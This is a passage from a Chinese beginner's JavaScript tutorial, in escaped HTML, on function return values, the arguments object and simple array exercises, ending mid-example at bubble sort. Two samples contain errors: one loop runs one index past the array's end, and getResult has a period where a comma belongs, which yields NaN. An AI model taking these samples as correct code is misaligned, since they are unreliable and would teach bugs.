&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 求数组[5, 2, 99, 101, 67, 77]中的最大值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getArrMax&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt;) {
                &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
            }
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;getArrMax&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;]);	&lt;span style=&#34;color:#75715e&#34;&gt;// 实参是一个数组送过去
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 在我们实际开发里面，我们经常用一个变量来接收函数的返回结果，使用更简单
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;re&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getArrMax&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;]);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;re&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;943-return-终止函数&#34;&gt;9.4.3 return 终止函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;return 语句之后的代码不被执行&lt;/li&gt;
&lt;li&gt;return 只能返回一个值，如果用逗号隔开多个值，以最后一个为准&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 函数返回值注意事项
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. return 终止函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// return语句后面的代码不会被执行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我是不会被执行的哦！&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. return 只能返回一个值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 我们求任意两个数的加减乘除结果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getResult&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;. &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;];
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;re&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getResult&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 返回的是一个数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;re&lt;/span&gt;);
    
    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 我们的函数如果有return 则返回的是return后面的值，如果函数没有return，则返回undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fun1&lt;/span&gt;() {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;666&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fun1&lt;/span&gt;());	&lt;span style=&#34;color:#75715e&#34;&gt;// 返回666
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fun2&lt;/span&gt;() {
        
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fun2&lt;/span&gt;());	&lt;span style=&#34;color:#75715e&#34;&gt;// 函数返回的结果是 undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;944-函数没有return-返回-undefined&#34;&gt;9.4.4 函数没有return 返回 undefined&lt;/h3&gt;
&lt;p&gt;函数都是有返回值的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果有return则返回return后面的值&lt;/li&gt;
&lt;li&gt;如果没有return则返回undefined&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;945-breakcontinuereturn-的区别&#34;&gt;9.4.5 break，continue，return 的区别&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;break：结束当前的循环体（如for、while）&lt;/li&gt;
&lt;li&gt;continue：跳出本次循环，继续执行下次循环（如for、while）&lt;/li&gt;
&lt;li&gt;return：不仅可以退出循环，还能够返回return语句中的值，同时还可以结束当前的函数体内的代码&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;946-通过榨汁机看透函数&#34;&gt;9.4.6 通过榨汁机看透函数&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511000634.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511000703.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;95-arguments的使用&#34;&gt;9.5 arguments的使用&lt;/h2&gt;
&lt;p&gt;当我们不确定有多少个参数传递的时候，可以用 &lt;strong&gt;arguments&lt;/strong&gt; 来获取。在 JavaScript 中，arguments 实际上它是当前函数的一个&lt;strong&gt;内置对象&lt;/strong&gt;。所以函数都内置了一个arguments对象，arguments对象中&lt;strong&gt;存储了传递的所有实参&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;arguments 展示形式是一个伪数组&lt;/strong&gt;，因此可以进行遍历。伪数组具有以下特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;具有 length 属性&lt;/li&gt;
&lt;li&gt;按索引方式储存数据&lt;/li&gt;
&lt;li&gt;不具有数组的 push，pop 等方法&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// arguments 的使用，只有函数才有arguments 对象，而且每个函数都内置好了这个arguments
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;() {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 里面存储了所有传递过来的实参
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);
        &lt;span style=&#34;color:#75715e&#34;&gt;// 我们可以按照数组的方式遍历 arguments
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
        }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 伪数组，并不是真正意义上的数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 具有数组的length属性
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 按照索引的方式进行存储的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 它没有真正数组的一些方法 pop() push()等
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例利用函数求任意个数的最大值&#34;&gt;案例：利用函数求任意个数的最大值&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 利用函数求任意个数的最大值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getMax&lt;/span&gt;() {	&lt;span style=&#34;color:#75715e&#34;&gt;// arguments = [1, 2, 3]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt;) {
                &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
            }
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getMax&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;));
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getMax&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;));
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getMax&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;444&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;));
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;96-函数案例&#34;&gt;9.6 函数案例&lt;/h2&gt;
&lt;h3 id=&#34;案例1利用函数封装方式翻转任意一个数组&#34;&gt;案例1：利用函数封装方式，翻转任意一个数组&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
   &lt;span style=&#34;color:#75715e&#34;&gt;// 利用函数翻转任意数组 reverse 翻转
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reverse&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) {
       &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
       &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {
           &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
       }
       &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;;
   }
   &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reverse&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]);
   &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;);
   &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reverse&lt;/span&gt;([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;]);
   &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;);

&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例2利用函数封装方式对数组排序----冒泡排序&#34;&gt;案例2：利用函数封装方式，对数组排序 &amp;ndash; 冒泡排序&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 利用函数冒泡排序 sort 排序
